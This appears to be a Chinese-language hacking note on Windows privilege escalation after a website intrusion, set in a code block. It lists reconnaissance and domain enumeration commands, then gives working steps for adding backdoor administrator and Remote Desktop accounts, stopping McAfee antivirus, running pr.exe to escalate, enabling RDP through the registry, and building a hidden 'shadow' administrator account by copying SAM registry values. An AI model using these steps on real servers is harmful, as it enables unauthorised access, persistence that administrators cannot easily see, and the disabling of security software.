  <article class="passage-article">
    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"> win提权</span><br><span class="line"></span><br><span class="line">提高自己在服务器中的权限，主要针对网站入侵过程中，当入侵某一网站时，通过各种漏洞提升WEBSHELL权限以夺得该服务器权限。</span><br><span class="line">提权常用DOS命令运用</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">查看版本：ver</span><br><span class="line">查看权限：whoami</span><br><span class="line">   tangyuan-pc 只是用户，这的 lizi 是管理员权限（一般电脑上的叫：Administrator）</span><br><span class="line">   在服务器中进行提权（以后会讲怎么提权），一般权限都是 user 的普通权限，或者是 guest （来宾）的权限</span><br><span class="line"></span><br><span class="line">查看配置：systeminfo</span><br><span class="line">   修补程序较少的服务器，用 exp 提权，希望很大</span><br><span class="line">   </span><br><span class="line">查看用户：net user</span><br><span class="line"></span><br><span class="line">查看进程：tasklist</span><br><span class="line"></span><br><span class="line">查看正在运行的服务：tasklist /svc</span><br><span class="line">主要是看着三个：serv-u mysql mssql</span><br><span class="line"></span><br><span class="line">查看开放的所有端口：netstat -ano</span><br><span class="line"></span><br><span class="line">查询会话情况：query user</span><br><span class="line">   当前这个服务器中有哪些用户正在访问这个服务器</span><br><span class="line"></span><br><span class="line">查看指定服务的路径：sc qc mssql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">添加用户并提升权限：</span><br><span class="line">net user jianmei daxia.asd /add &amp; net localgroup administrators jianmei /add</span><br><span class="line"></span><br><span class="line">查看指定用户的信息：net user jianmei</span><br><span class="line">查看所有管理权限的用户：net localgroup administrators</span><br><span class="line">加入远程桌面用户组：net localgroup “Remote Desktop Users” jianmei /add</span><br><span class="line"></span><br><span class="line">   添加用户不成功的时候会提示你，再运行这句话就好</span><br><span class="line"></span><br><span class="line">突破最大连接数：mstsc /admin /v:192.168.1.101</span><br><span class="line"></span><br><span class="line">   最后的是服务器的 IP 地址</span><br><span class="line">   运行 加入远程桌面用户组时，若有人设置了会提示这个问题</span><br><span class="line"></span><br><span class="line">删除用户：net user jianmei /del</span><br><span class="line">开启TELNET服务：net start telnet</span><br><span class="line">关闭麦咖啡：net stop “McAfee McShield”</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dsquery</span><br><span class="line"></span><br><span class="line">    列出该域内所有机器名(dsquery computer domainroot -limit 65535 &amp;&amp; net group “domain computers” /domain)</span><br><span class="line">    列出该域内所有用户名(dsquery user domainroot -limit 65535 &amp;&amp; net user /domain)</span><br><span class="line">    列出该域内网段划分 (dsquery subnet)</span><br><span class="line">    列出该域内分组 (dsquery group &amp;&amp; net group /domain)</span><br><span class="line">    列出该域内组织单位 (dsquery ou)</span><br><span class="line">    列出该域内域控制器 (dsquery server &amp;&amp; net time /domain)</span><br><span class="line">    列出域管理员帐号 (net group “domain admins” /domain)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看当前目录的所有文件：dir c:\windows\</span><br><span class="line">查看指定文件的内容：</span><br><span class="line"></span><br><span class="line">type C:\windows\Debug.txt</span><br><span class="line"></span><br><span class="line">复制文件</span><br><span class="line"></span><br><span class="line">把Debug.txt复制到C:\windows\addins\并命名为cmd.txt：</span><br><span class="line"></span><br><span class="line">copy C:\windows\Debug.txt C:\windows\addins\cmd.txt</span><br><span class="line"></span><br><span class="line">切换目录</span><br><span class="line"></span><br><span class="line">切换到系统根目录：cd \</span><br><span class="line">切换到windows目录：cd windwos</span><br><span class="line">返回上一级目录：cd ..</span><br><span class="line">进入系统e盘：e：</span><br><span class="line"></span><br><span class="line">pushed命令</span><br><span class="line">如果想直接进入某个指定的目录，可使用pushd命令。</span><br><span class="line">如果直接进入c:\windows\system32\目录，可执行如下命令：Pushd c:\windows\system32\</span><br><span class="line"></span><br><span class="line">创建ahackj文件夹：Md ahackj</span><br><span class="line">删除ahakcj文件夹：Rd ahackj</span><br><span class="line">删除网站目录下的ahackj.asp文件：</span><br><span class="line"></span><br><span class="line">Del E:\xinyun\ahackj.asp</span><br><span class="line"></span><br><span class="line">pr提权</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pr格式</span><br><span class="line"></span><br><span class="line">pr.exe &quot;netstat -ano&quot;</span><br><span class="line"></span><br><span class="line">pr.exe &quot;net user test8 test@123 /add</span><br><span class="line"></span><br><span class="line">pr.exe &quot;net localgroup administrators test /add&quot;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">开启3389 </span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">3389</span><br><span class="line">mstsc</span><br><span class="line"></span><br><span class="line">历年漏洞查看</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010</span><br><span class="line"></span><br><span class="line">影子账户</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">regedit.exe</span><br><span class="line">1、对注册表赋予权限</span><br><span class="line"></span><br><span class="line">默认注册表HKEY_LOCAL_MACHINE\SAM\SAM\只有system权限才能修改</span><br><span class="line"></span><br><span class="line">现在需要为其添加管理员权限</span><br><span class="line"></span><br><span class="line">右键-权限-选中Administrators，允许完全控制</span><br><span class="line"></span><br><span class="line">2、新建特殊帐户</span><br><span class="line"></span><br><span class="line">    net user test$ 123456 /add</span><br><span class="line">    net localgroup administrators test$ /add</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line">用户名要以$结尾</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3、导出注册表</span><br><span class="line"></span><br><span class="line">在注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names下找到新建的帐户test$</span><br><span class="line"></span><br><span class="line">获取默认类型为0x3ea</span><br><span class="line"></span><br><span class="line">将注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\test$导出为1.reg</span><br><span class="line"></span><br><span class="line">在注册表下能够找到对应类型名称的注册表项HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA</span><br><span class="line">右键将该键导出为2.reg，</span><br><span class="line"></span><br><span class="line">默认情况下，管理员帐户Administrator对应的注册表键值为HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</span><br><span class="line"></span><br><span class="line">同样，右键将该键导出为3.reg</span><br><span class="line"></span><br><span class="line">将注册表项HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA下键F的值替换为HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4下键F的值，即2.reg中键F的值替换成3.reg中键F的值</span><br><span class="line"></span><br><span class="line">4、命令行删除特殊帐户</span><br><span class="line"></span><br><span class="line">net user test$ /del</span><br><span class="line"></span><br><span class="line">5、导入reg文件</span><br><span class="line"></span><br><span class="line">    regedit /s 1.reg</span><br><span class="line">    regedit /s 2.reg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">删除方法：</span><br><span class="line"></span><br><span class="line">删除注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\下对应帐户的键值(共有两处)</span><br></pre></td></tr></table></figure>
